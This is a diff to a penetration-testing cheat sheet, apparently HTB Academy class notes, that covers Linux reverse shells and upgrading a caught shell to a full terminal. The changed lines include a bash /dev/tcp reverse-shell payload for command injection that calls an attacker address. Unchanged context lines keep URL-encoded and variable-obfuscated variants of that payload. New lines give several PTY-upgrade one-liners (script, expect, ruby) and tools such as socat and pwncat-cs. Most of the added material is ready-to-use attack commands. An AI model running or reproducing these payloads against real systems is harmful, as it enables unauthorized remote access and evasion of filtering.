@@ -85,7 +85,7 @@ bash -i >& /dev/tcp/10.10.14.x/9001 0>&1
 bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.10.14.x%2F9001%200%3E%261%22
 
 # From command injection
-$(bash -c 'bash -i >& /dev/tcp/10.10.14.x/4444 0>&1')
+$(bash -c 'bash -i >& /dev/tcp/10.10.14.x/9002 0>&1')
 ```
 
 > [!warning] `>& /dev/tcp/...` is **bash-only** — `sh`/dash (and therefore **cron**, whose shell is `/bin/sh`) can't parse it and fails *silently*. Whenever the redirection is read by a non-bash shell (a cron line, a `#!/bin/sh` script, an `at`/scheduler `--command`), wrap it so bash parses its own redirection: `bash -c 'bash -i >& /dev/tcp/host/port 0>&1'`. Full explanation + the `SHELL=/bin/bash` alternative: [[Linux Priv Esc]] → Cron Jobs.
@@ -236,12 +236,25 @@ export SHELL=/bin/bash
 stty rows 50 cols 220
 ```
 
-### Method 2: script
+### Method 2: No Python? — PTY ladder
+
+No `python`/`python3` is common. The thing that matters: does the tool **allocate a real PTY** (like python's `pty.spawn`, which includes the io-copy loop) or does it just **`exec` a shell** onto the same dumb pipe? Only the former is a real upgrade.
+
+**Clean one-liner that allocates a real PTY — essentially the whole reliable set:**
 
 ```bash
-script -qc /bin/bash /dev/null
-# Then do Ctrl+Z → stty raw -echo; fg → export TERM=xterm
+script -qc /bin/bash /dev/null                 # util-linux — near-universal on Debian/Ubuntu
+#   BSD/macOS arg order:  script -q /dev/null /bin/bash
+expect -c 'spawn /bin/bash; interact'          # expect allocates a PTY
+ruby -e 'require "pty";PTY.spawn("/bin/bash"){|r,w,p|Thread.new{loop{w.print STDIN.getc}};loop{STDOUT.print r.getc}}'
+#   ^ Ruby's stdlib `pty` DOES work, but the one-liner is clunky (you write the copy loop) — prefer script/expect
 ```
+
+Then finish exactly like Method 1: `Ctrl+Z` → `stty raw -echo; fg` → `export TERM=xterm`.
+
+**No scripted PTY on the box → pull one over the wire, or drop a helper:** `socat` (Method 3) or a `pwncat-cs` listener (auto-upgrades, no victim-side command) both hand you a full PTY. Otherwise upload a prebuilt helper — a **static Go PTY binary** (`creack/pty`) or a static `socat`/`script` — because the "magic" is the copy loop those already contain.
+
+> [!warning] **Bare `exec` is NOT a PTY.** `perl -e 'exec "/bin/bash";'` / `ruby -e 'exec "/bin/bash"'` just swap the process for bash on the *same dumb pipe* — no terminal. **Perl** needs the CPAN `IO::Pty`/`Expect` module for a real PTY (rarely preinstalled); **Go/C/.NET** have no clean one-liner (you'd compile a helper that runs `forkpty` + a select-loop). When you genuinely can't get a PTY, do the **stty-only half** — `Ctrl+Z` → `stty raw -echo; fg` → `export TERM=xterm` — for raw-mode/arrow-keys on the dumb pipe (but `sudo`/`ssh`/`su`/`vi` may still choke). **Windows target?** The PTY story there is [[Class notes/HTB Academy/CPTS v2 (claude)/Shells & Payloads#ConPTY Shell (fully interactive Windows)|ConPtyShell]], not any of these.
 
 ### Method 3: socat (fully interactive, no extra steps)
 
@@ -557,6 +570,7 @@ c=bas;h=h;$c$h -i >& /dev/tcp/10.10.14.x/4444 0>&1
 
 4. After catching shell (Linux) — upgrade TTY
    - python3 -c 'import pty; pty.spawn("/bin/bash")'
+   - no python? → script -qc /bin/bash /dev/null  (or expect; else stty-only)
    - Ctrl+Z → stty raw -echo; fg
    - export TERM=xterm
 
@@ -575,5 +589,5 @@ c=bas;h=h;$c$h -i >& /dev/tcp/10.10.14.x/4444 0>&1
 ---
 
 *Created: 2026-02-27*
-*Updated: 2026-08-14*
+*Updated: 2026-09-02*
 *Model: claude-opus-5*
